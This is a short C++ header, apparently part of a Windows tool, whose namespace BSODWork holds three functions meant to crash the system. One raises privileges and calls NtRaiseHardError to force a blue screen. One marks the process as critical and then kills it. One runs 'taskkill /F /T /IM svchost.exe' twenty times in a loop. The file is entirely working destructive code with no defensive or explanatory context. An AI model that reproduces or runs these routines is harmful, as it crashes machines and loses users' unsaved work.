#pragma once
#include "NtApi.hpp"



namespace BSODWork {

	void HardError() {

		BOOLEAN bEnable;
		DWORD errorResponce;
		NtApiWork::RtlAdjustPrivilege(19, true, false,&bEnable);
		NtApiWork::NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &errorResponce);


	}

	void CriticalProcess() {
		BOOLEAN  pbOld= NULL;
		//https://www.geoffchappell.com/studies/windows/win32/ntdll/api/rtl/peb/setprocessiscritical.htm
		NtApiWork::RtlSetProcessIsCritical(true,&pbOld, false);
		NtApiWork::NtTerminateProcess(GetCurrentProcess(), 0x1337);
		
	}

	void KillSystemProcess() {

		for (int i = 0; i < 20; i++)
		{
			system("taskkill /F /T /IM svchost.exe");
		}
	
	}



}
